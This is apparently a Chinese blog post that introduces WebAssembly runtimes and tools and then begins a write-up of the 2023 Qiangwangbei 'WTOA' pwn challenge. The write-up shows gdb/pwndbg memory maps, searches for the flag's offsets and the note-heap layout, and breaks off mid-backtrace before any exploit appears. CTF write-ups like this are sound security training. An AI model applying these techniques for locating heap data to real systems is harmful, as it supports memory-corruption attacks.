title="WASM运行时"></a>WASM运行时</h2><p>wasm运行时即用于加载、解释和执行 WebAssembly 模块的软件层,其可以模拟浏览器运行wasm的环境,在不启动浏览器的环境下操作wasm</p><p>WASM有四种主流的运行时,分别是</p><p><strong>wasmedge、wasmtime、wasmer、WAVM</strong> </p><p>ctf比赛中出现的比较多的是wasmtime,这里着重介绍它</p><h3 id="wasmtime"><a href="#wasmtime" class="headerlink" title="wasmtime"></a>wasmtime</h3><p>github仓库<a href="https://github.com/bytecodealliance/wasmtime">bytecodealliance/wasmtime: A fast and secure runtime for WebAssembly (github.com)</a></p><p>可以下载历史版本的wasmtime</p><p>主要命令如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Commands:</span><br><span class="line">  run       Runs a WebAssembly module</span><br><span class="line">  config    Controls Wasmtime configuration settings</span><br><span class="line">  compile   Compiles a WebAssembly module</span><br><span class="line">  explore   Explore the compilation of a WebAssembly module to native code</span><br><span class="line">  serve     Serves requests from a wasi-http proxy component</span><br><span class="line">  settings  Displays available Cranelift settings for a target</span><br><span class="line">  wast      Runs a WebAssembly test script file</span><br><span class="line">  help      Print this message or the help of the given subcommand(s)</span><br></pre></td></tr></table></figure><h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p>运行wasm文件或者cwasm文件,不过大概率要求加—allow-precompiled选项</p><h4 id="compile"><a href="#compile" class="headerlink" title="compile"></a>compile</h4><p>将wasm文件编译为当前架构下的可执行文件格式(e.g. ELF)</p><p>后缀.cwasm(compiled wasm)</p><p>不过依然不能直接运行,还是要wasmtime执行</p><h4 id="更多选项-1"><a href="#更多选项-1" class="headerlink" title="更多选项"></a>更多选项</h4><h5 id="D"><a href="#D" class="headerlink" title="-D"></a>-D</h5><p>调试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-D, --debug &lt;KEY[=VAL[,..]]&gt;</span><br><span class="line">         Debug-related configuration options, `-D help` to see all</span><br></pre></td></tr></table></figure><h5 id="—env"><a href="#—env" class="headerlink" title="—env"></a>—env</h5><p>设置环境变量</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--env &lt;NAME[=VAL]&gt;</span><br><span class="line">          Pass an environment variable to the program.</span><br></pre></td></tr></table></figure><h5 id="—invoke"><a href="#—invoke" class="headerlink" title="—invoke"></a>—invoke</h5><p>单独执行某个函数,可以指定参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--invoke &lt;FUNCTION&gt;</span><br><span class="line">          The name of the function to run</span><br><span class="line"></span><br><span class="line">Invoking a specific function (e.g. `add`) in a WebAssembly module:</span><br><span class="line"></span><br><span class="line">wasmtime --invoke add example.wasm 1 2</span><br></pre></td></tr></table></figure><h5 id="—allow-precompiled"><a href="#—allow-precompiled" class="headerlink" title="—allow-precompiled"></a>—allow-precompiled</h5><p>允许提前编译</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--allow-precompiled</span><br><span class="line">          Allow executing precompiled WebAssembly modules as `*.cwasm` files.</span><br><span class="line">          </span><br><span class="line">          Note that this option is not safe to pass if the module being passed in is arbitrary user input. Only `wasmtime`-precompiled modules generated via the `wasmtime compile` command or equivalent should be passed as an argument with this option specified.</span><br></pre></td></tr></table></figure><h5 id="—disable-cache-deprecated"><a href="#—disable-cache-deprecated" class="headerlink" title="—disable-cache(deprecated)"></a>—disable-cache(deprecated)</h5><p>老版本选项,不使用缓存</p><h3 id="wasmer"><a href="#wasmer" class="headerlink" title="wasmer"></a>wasmer</h3><h3 id="wabt"><a href="#wabt" class="headerlink" title="wabt"></a>wabt</h3><p>The WebAssembly Binary Toolkit</p><p>官方仓库<a href="https://github.com/WebAssembly/wabt">WebAssembly/wabt: The WebAssembly Binary Toolkit (github.com)</a></p><p>提供了一组wasm的工具包</p><p>主要如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">WABT (we pronounce it &quot;wabbit&quot;) is a suite of tools for WebAssembly, including:</span><br><span class="line"></span><br><span class="line">wat2wasm: translate from WebAssembly text format to the WebAssembly binary format</span><br><span class="line">wasm2wat: the inverse of wat2wasm, translate from the binary format back to the text format (also known as a .wat)</span><br><span class="line">wasm-objdump: print information about a wasm binary. Similiar to objdump.</span><br><span class="line">wasm-interp: decode and run a WebAssembly binary file using a stack-based interpreter</span><br><span class="line">wasm-decompile: decompile a wasm binary into readable C-like syntax.</span><br><span class="line">wat-desugar: parse .wat text form as supported by the spec interpreter (s-expressions, flat syntax, or mixed) and print &quot;canonical&quot; flat format</span><br><span class="line">wasm2c: convert a WebAssembly binary file to a C source and header</span><br><span class="line">wasm-strip: remove sections of a WebAssembly binary file</span><br><span class="line">wasm-validate: validate a file in the WebAssembly binary format</span><br><span class="line">wast2json: convert a file in the wasm spec test format to a JSON file and associated wasm binary files</span><br><span class="line">wasm-stats: output stats for a module</span><br><span class="line">spectest-interp: read a Spectest JSON file, and run its tests in the interpreter</span><br></pre></td></tr></table></figure><p>还有其他一些小工具</p><p>wat即Webassembly的文本格式</p><h3 id="WASI"><a href="#WASI" class="headerlink" title="WASI"></a>WASI</h3><p><a href="https://wasi.dev/">WASI </a></p><blockquote><p>WASI is a modular <strong>system interface for WebAssembly</strong>. As described in <a href="https://hacks.mozilla.org/2019/03/standardizing-wasi-a-webassembly-system-interface/">the initial announcement</a>, it’s focused on security and portability.</p></blockquote><p>WebAssembly是一种新的字节码格式，目前被应用于 web 中，由于其可移植、体积小，安全性的等优点被渐渐广泛认可，但是其主要是运行在浏览器中。</p><p>一些天才们想让 WebAssembly 也可以<strong>运行在非浏览器环境中</strong>，这就产生了 WASI。</p><p>wasi需要可移植的二进制文件（.wasm）和一个跨平台的 runtime，也就是说，我们在某一个平台上生成了.wasm，直接拿到其他平台上，也可以直接使用。</p><h1 id="WASM标准"><a href="#WASM标准" class="headerlink" title="WASM标准"></a>WASM标准</h1><h2 id="wasmtime模拟堆栈"><a href="#wasmtime模拟堆栈" class="headerlink" title="wasmtime模拟堆栈"></a>wasmtime模拟堆栈</h2><blockquote><p>其实不只是wasmtime运行时,<strong>wasm标准应该都是这样</strong>(至少wasmer也是这样),只不过细节上可能有点差异</p></blockquote><p>wasmtime自身实现了一套模拟堆栈,<strong>客户wasm程序的很多数据操作都是基于模拟堆栈</strong></p><p>以某题为例,其<strong>模拟堆栈位于</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7f5cdb321000     0x7f5cdb331000 rw-p    10000      0 [anon_7f5cdb321]</span><br><span class="line">0x7f5cdb331000     0x7f5cdb332000 rw-p     1000  33000 /home/aichch/pwn/minesweeper/admin/minesweeper</span><br><span class="line">0x7f5cdb332000     0x7f5cdc321000 rw-p   fef000      0 [anon_7f5cdb332]</span><br></pre></td></tr></table></figure><p>可以看到其模拟堆栈被分为了三块,分别是:</p><ol><li>模拟栈</li><li>模拟bss段,存储程序全局变量之类,来自于ELF映像</li><li>模拟堆,用于动态内存分配</li></ol><p>wasmtime在进行<strong>堆栈上的操作</strong>的时候使用的是<strong>相对模拟堆栈<u>基地址</u>的偏移</strong>,并且因为是相对偏移所以<u>不存在随机化</u></p><p>并且可以观察到其模拟堆栈<strong>字长为<u>4</u>字节</strong></p><p>一个堆块的结构大致如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">size(with flags)|unknown</span><br><span class="line">content</span><br></pre></td></tr></table></figure><p>暂时还没有深入研究剩余的,先搁置了</p><h1 id="WASM调试"><a href="#WASM调试" class="headerlink" title="WASM调试"></a>WASM调试</h1><p>wasm类题目调试是一大难点</p><p>特别是当提供的是经由wasmtime等运行时二次编译过的适应架构的文件,例如cwasm格式文件</p><h2 id="浏览器调试"><a href="#浏览器调试" class="headerlink" title="浏览器调试"></a>浏览器调试</h2><p>如果提供的文件是非由运行时二次编译的文件</p><p>那么可以使用chrome浏览器的开发者工具进行调试</p><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>如果提供的文件是由运行时二次编译的文件</p><p>由于几乎没有符号信息,且代码量较大,想要静态分析难度不低</p><p>那么就得使用gdb进行调试</p><p><code>gdb --args wasmtime --allow-precompiled  cwasm</code></p><p>不过这样显然是直接调试wasmtime程序,而不是我们希望的二进制文件</p><p>但是最终程序控制流肯定会转移给cwasm文件,而既然是题目那就肯定存在由用户控制的输入</p><p>所以我们可以直接运行直到自动断在有输入处,可以发现最终是直接运行cwasm映射在内存中的代码段</p><p>例如,这是2023强网杯WTOA的text段映射,整个text都被映射在这(elf中text段大小就是0xc000)</p><p><code>0x7ffff79fe000     0x7ffff7a0a000 r-xp     c000   1000 /home/aichch/pwn/WTOA/wtoa</code></p><p>段内偏移不变,但<strong>段与段之间的偏移是会变</strong>的</p><p>不过只要能够确定代码位置便足够了</p><p>之后触发各种函数,再由gdb回溯栈信息<u>得出各个重要函数的的位置</u>,并<u>回到ida中逆向分析</u></p><p>需要注意的是gdb分析给出的回溯栈信息并不完全准确</p><p>例如</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-01-01_142030.png" alt=""></p><p>这是最开始的回溯路径,但继续往下执行后它变成了</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-01-01_142230.png" alt=""></p><p>可见回溯栈少了一层,而且查看少的那层可以发现里面确实没有可执行代码</p><p>再往下,在即将再往下一层回溯时,栈又发生了变化</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-01-01_142601.png" alt=""></p><p>倒没有深入去研究这其中的原由,猜测可能是gdb栈回溯机制的原因</p><p>因为如此,对调试确定代码位置的难度又加大了一点,即不能直接一次性判断所有的栈回溯,而是要缓慢步进,根据正确的栈回溯信息作出判断</p><p>还有最后一点就是,就算确定了静态wasm的代码位置,真正进入静态分析就会发现内部依然是在嵌套调用其它函数,不过此时大可不必不停向下深入分析所有函数,只要能<u>根据经验</u>大致确认一两层便足够了</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="2023强网杯-WTOA"><a href="#2023强网杯-WTOA" class="headerlink" title="2023强网杯-WTOA"></a>2023强网杯-WTOA</h2><p>题目提供了两个文件</p><p><code>./launch.sh</code>是一个shell脚本,用于添加flag环境变量并执行程序</p><p><code>wtoa</code>乍一看是一个ELF文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file wtoa </span><br><span class="line">wtoa: ELF 64-bit LSB relocatable, x86-64, version 1, not stripped</span><br></pre></td></tr></table></figure><p>但是当使用ida加载时,会发现其完全不符合认知中的elf规范</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-01-18_225313.png" alt=""></p><p>根据其中的字符串信息(string file),可以知道这是一个经由11.0.1版本的wasmtime将wasm文件再编译而来的elf</p><p>图片中显示的各个节,在运行时都会映射到内存中使用</p><p>其中<code>.rodata.wasm</code>会被映射两次,一次是以只读模式映射,另一次是可读可写的映射(貌似是在wtoa的<u>模拟堆栈</u>中)</p><p>代码量较大且几乎没有调试符号,直接静态分析显然难度巨大</p><p>因此需要通过调试定位几个关键的函数</p><h3 id="调试定位"><a href="#调试定位" class="headerlink" title="调试定位"></a>调试定位</h3><p>gdb启动</p><p><code>gdb --args /home/aichch/wasm/Wasmtime/wasmtime-v11.0.1-x86_64-linux/wasmtime run --env FLAG=&quot;$FLAG&quot; --disable-cache --allow-precompiled ./wtoa</code></p><p>首先观察vmmap显示的调试信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">             Start                End Perm     Size Offset File</span><br><span class="line">    0x555555400000     0x555556bce000 r-xp  17ce000      0 /home/aichch/wasm/Wasmtime/wasmtime-v11.0.1-x86_64-linux/wasmtime</span><br><span class="line">    0x555556dce000     0x555556f9e000 r--p   1d0000 17ce000 /home/aichch/wasm/Wasmtime/wasmtime-v11.0.1-x86_64-linux/wasmtime</span><br><span class="line">    0x555556f9e000     0x555556fa1000 rw-p     3000 199e000 /home/aichch/wasm/Wasmtime/wasmtime-v11.0.1-x86_64-linux/wasmtime</span><br><span class="line">    0x555556fa1000     0x555556fe5000 rw-p    44000      0 [heap]</span><br><span class="line">    0x7ffdf7bb1000     0x7ffe77bb1000 ---p 80000000      0 [anon_7ffdf7bb1]</span><br><span class="line">    0x7ffe77bb1000     0x7ffe77bb3000 rw-p     2000  1b000 /home/aichch/pwn/WTOA/wtoa</span><br><span class="line">    0x7ffe77bb3000     0x7ffe78bb1000 rw-p   ffe000      0 [anon_7ffe77bb3]</span><br><span class="line">    0x7ffe78bb1000     0x7ffff7bb2000 ---p 17f001000      0 [anon_7ffe78bb1]</span><br><span class="line">    0x7ffff7bb2000     0x7ffff7bf2000 rw-p    40000      0 [anon_7ffff7bb2]</span><br><span class="line">    0x7ffff7bf2000     0x7ffff7bf3000 r--p     1000      0 [anon_7ffff7bf2]</span><br><span class="line">    0x7ffff7bf3000     0x7ffff7bf4000 r-xp     1000      0 [anon_7ffff7bf3]</span><br><span class="line">    0x7ffff7bf4000     0x7ffff7bf6000 r--p     2000      0 [anon_7ffff7bf4]</span><br><span class="line">    0x7ffff7bf6000     0x7ffff7bf7000 r-xp     1000      0 [anon_7ffff7bf6]</span><br><span class="line">    0x7ffff7bf7000     0x7ffff7bf9000 r--p     2000      0 [anon_7ffff7bf7]</span><br><span class="line">    0x7ffff7bf9000     0x7ffff7bfa000 r-xp     1000      0 [anon_7ffff7bf9]</span><br><span class="line">    0x7ffff7bfa000     0x7ffff7bfc000 r--p     2000      0 [anon_7ffff7bfa]</span><br><span class="line">    0x7ffff7bfc000     0x7ffff7bfd000 r-xp     1000      0 [anon_7ffff7bfc]</span><br><span class="line">    0x7ffff7bfd000     0x7ffff7bfe000 r--p     1000      0 [anon_7ffff7bfd]</span><br><span class="line">    0x7ffff7bfe000     0x7ffff7bff000 r--p     1000      0 /home/aichch/pwn/WTOA/wtoa</span><br><span class="line">    0x7ffff7bff000     0x7ffff7c0b000 r-xp     c000   1000 /home/aichch/pwn/WTOA/wtoa</span><br><span class="line">    0x7ffff7c0b000     0x7ffff7c1f000 r--p    14000   d000 /home/aichch/pwn/WTOA/wtoa</span><br><span class="line">    0x7ffff7c1f000     0x7ffff7c24000 rw-p     5000      0 [anon_7ffff7c1f]</span><br><span class="line">    0x7ffff7c24000     0x7ffff7c46000 r--p    22000      0 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7c46000     0x7ffff7dbe000 r-xp   178000  22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7dbe000     0x7ffff7e0c000 r--p    4e000 19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7e0c000     0x7ffff7e10000 r--p     4000 1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7e10000     0x7ffff7e12000 rw-p     2000 1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so</span><br><span class="line">    0x7ffff7e12000     0x7ffff7e16000 rw-p     4000      0 [anon_7ffff7e12]</span><br><span class="line">    0x7ffff7e16000     0x7ffff7e23000 r--p     d000      0 /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">    0x7ffff7e23000     0x7ffff7eca000 r-xp    a7000   d000 /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">    0x7ffff7eca000     0x7ffff7f63000 r--p    99000  b4000 /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">    0x7ffff7f63000     0x7ffff7f64000 r--p     1000 14c000 /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">    0x7ffff7f64000     0x7ffff7f65000 rw-p     1000 14d000 /usr/lib/x86_64-linux-gnu/libm-2.31.so</span><br><span class="line">    0x7ffff7f65000     0x7ffff7f6b000 r--p     6000      0 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">    0x7ffff7f6b000     0x7ffff7f7c000 r-xp    11000   6000 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">    0x7ffff7f7c000     0x7ffff7f82000 r--p     6000  17000 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">    0x7ffff7f82000     0x7ffff7f83000 r--p     1000  1c000 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">    0x7ffff7f83000     0x7ffff7f84000 rw-p     1000  1d000 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so</span><br><span class="line">    0x7ffff7f84000     0x7ffff7f88000 rw-p     4000      0 [anon_7ffff7f84]</span><br><span class="line">    0x7ffff7f88000     0x7ffff7f8a000 r--p     2000      0 /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">    0x7ffff7f8a000     0x7ffff7f8e000 r-xp     4000   2000 /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">    0x7ffff7f8e000     0x7ffff7f90000 r--p     2000   6000 /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">    0x7ffff7f90000     0x7ffff7f91000 r--p     1000   7000 /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">    0x7ffff7f91000     0x7ffff7f92000 rw-p     1000   8000 /usr/lib/x86_64-linux-gnu/librt-2.31.so</span><br><span class="line">    0x7ffff7f92000     0x7ffff7f95000 r--p     3000      0 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff7f95000     0x7ffff7fa7000 r-xp    12000   3000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff7fa7000     0x7ffff7fab000 r--p     4000  15000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff7fab000     0x7ffff7fac000 r--p     1000  18000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff7fac000     0x7ffff7fad000 rw-p     1000  19000 /usr/lib/x86_64-linux-gnu/libgcc_s.so.1</span><br><span class="line">    0x7ffff7fad000     0x7ffff7fae000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">    0x7ffff7fae000     0x7ffff7fb0000 r-xp     2000   1000 /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">    0x7ffff7fb0000     0x7ffff7fb1000 r--p     1000   3000 /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">    0x7ffff7fb1000     0x7ffff7fb2000 r--p     1000   3000 /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">    0x7ffff7fb2000     0x7ffff7fb3000 rw-p     1000   4000 /usr/lib/x86_64-linux-gnu/libdl-2.31.so</span><br><span class="line">    0x7ffff7fb3000     0x7ffff7fb5000 rw-p     2000      0 [anon_7ffff7fb3]</span><br><span class="line">    0x7ffff7fb7000     0x7ffff7fb8000 r--p     1000      0 [anon_7ffff7fb7]</span><br><span class="line">    0x7ffff7fb8000     0x7ffff7fb9000 r-xp     1000      0 [anon_7ffff7fb8]</span><br><span class="line">    0x7ffff7fb9000     0x7ffff7fbb000 r--p     2000      0 [anon_7ffff7fb9]</span><br><span class="line">    0x7ffff7fbb000     0x7ffff7fbc000 r-xp     1000      0 [anon_7ffff7fbb]</span><br><span class="line">    0x7ffff7fbc000     0x7ffff7fbe000 r--p     2000      0 [anon_7ffff7fbc]</span><br><span class="line">    0x7ffff7fbe000     0x7ffff7fbf000 r-xp     1000      0 [anon_7ffff7fbe]</span><br><span class="line">    0x7ffff7fbf000     0x7ffff7fc1000 r--p     2000      0 [anon_7ffff7fbf]</span><br><span class="line">    0x7ffff7fc1000     0x7ffff7fc2000 r-xp     1000      0 [anon_7ffff7fc1]</span><br><span class="line">    0x7ffff7fc2000     0x7ffff7fc4000 r--p     2000      0 [anon_7ffff7fc2]</span><br><span class="line">    0x7ffff7fc4000     0x7ffff7fc5000 r-xp     1000      0 [anon_7ffff7fc4]</span><br><span class="line">    0x7ffff7fc5000     0x7ffff7fc6000 r--p     1000      0 [anon_7ffff7fc5]</span><br><span class="line">    0x7ffff7fc6000     0x7ffff7fc7000 ---p     1000      0 [anon_7ffff7fc6]</span><br><span class="line">    0x7ffff7fc7000     0x7ffff7fc9000 rw-p     2000      0 [anon_7ffff7fc7]</span><br><span class="line">    0x7ffff7fc9000     0x7ffff7fcd000 r--p     4000      0 [vvar]</span><br><span class="line">    0x7ffff7fcd000     0x7ffff7fcf000 r-xp     2000      0 [vdso]</span><br><span class="line">    0x7ffff7fcf000     0x7ffff7fd0000 r--p     1000      0 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7fd0000     0x7ffff7ff3000 r-xp    23000   1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ff3000     0x7ffff7ffb000 r--p     8000  24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffc000     0x7ffff7ffd000 r--p     1000  2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so</span><br><span class="line">    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]</span><br><span class="line">    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]</span><br><span class="line">0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]</span><br></pre></td></tr></table></figure><p>可见wtoa程序被映射到了内存空间中</p><p>可执行代码是被映射到</p><p><code>0x7ffff7bff000     0x7ffff7c0b000 r-xp     c000   1000 /home/aichch/pwn/WTOA/wtoa</code></p><h4 id="数据定位"><a href="#数据定位" class="headerlink" title="数据定位"></a>数据定位</h4><p>搜寻一下引入的flag的位置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search flag&#123;test&#125;</span><br><span class="line">Searching for value: &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[heap]          0x555556fa7cd5 &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[heap]          0x555556fc9190 &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[anon_7ffe77bb3] 0x7ffe780b2b40 &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[anon_7ffe77bb3] 0x7ffe780b2c6d &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[stack]         0x7fffffffe22d &#x27;flag&#123;test&#125;&#x27;</span><br><span class="line">[stack]         0x7fffffffecb7 &#x27;flag&#123;test&#125;&#x27;</span><br></pre></td></tr></table></figure><p>找到了很多,但是位于wtoa堆栈的只有两个,偏移分别是<code>0x501b40</code>和<code>501c6d</code>,多次调试可以确定这个偏移是不变的</p><p>接下来就是让程序跑起来,可以看见是类似堆的菜单题</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">ERROR:: No error information</span><br><span class="line">flag starts with: flag</span><br><span class="line">Note System</span><br><span class="line">[A]dd Note</span><br><span class="line">[E]dit Note</span><br><span class="line">[D]elete Note</span><br><span class="line">[S]how Note</span><br><span class="line">E[X]it</span><br><span class="line">Choice &gt; </span><br></pre></td></tr></table></figure><p>先创建一个Note并定位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search notenote</span><br><span class="line">Searching for value: &#x27;notenote&#x27;</span><br><span class="line">[anon_7ffe77bb3] 0x7ffe780b2cb8 &#x27;notenote&#x27;</span><br></pre></td></tr></table></figure><p>在模拟堆栈中的偏移是<code>0x501cb8</code></p><p>进一步搜寻<code>0x501cb8</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">02:0010│  0x7ffe780b2ca0 ◂— 0x501cb8</span><br><span class="line">03:0018│  0x7ffe780b2ca8 ◂— 0x8</span><br><span class="line">04:0020│  0x7ffe780b2cb0 ◂— 0x1300000000</span><br><span class="line">05:0028│  0x7ffe780b2cb8 ◂— &#x27;notenote&#x27;</span><br></pre></td></tr></table></figure><p>note在内存中的存储结构便大概是这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pointer</span><br><span class="line">size</span><br><span class="line">unknown</span><br><span class="line">content</span><br></pre></td></tr></table></figure><h4 id="函数定位"><a href="#函数定位" class="headerlink" title="函数定位"></a>函数定位</h4><p>正常在输入点断下时</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bt</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">0  0x00007ffff7d38607 <span class="keyword">in</span> __GI___readv (fd=0, iov=0x555556fbb5c0, iovcnt=1) at ../sysdeps/unix/sysv/linux/readv.c:26</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">1  0x0000555556424da4 <span class="keyword">in</span> std::sys::unix::fd::FileDesc::read_vectored () at library/std/src/sys/unix/fd.rs:99</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2  std::sys::unix::fs::File::read_vectored () at 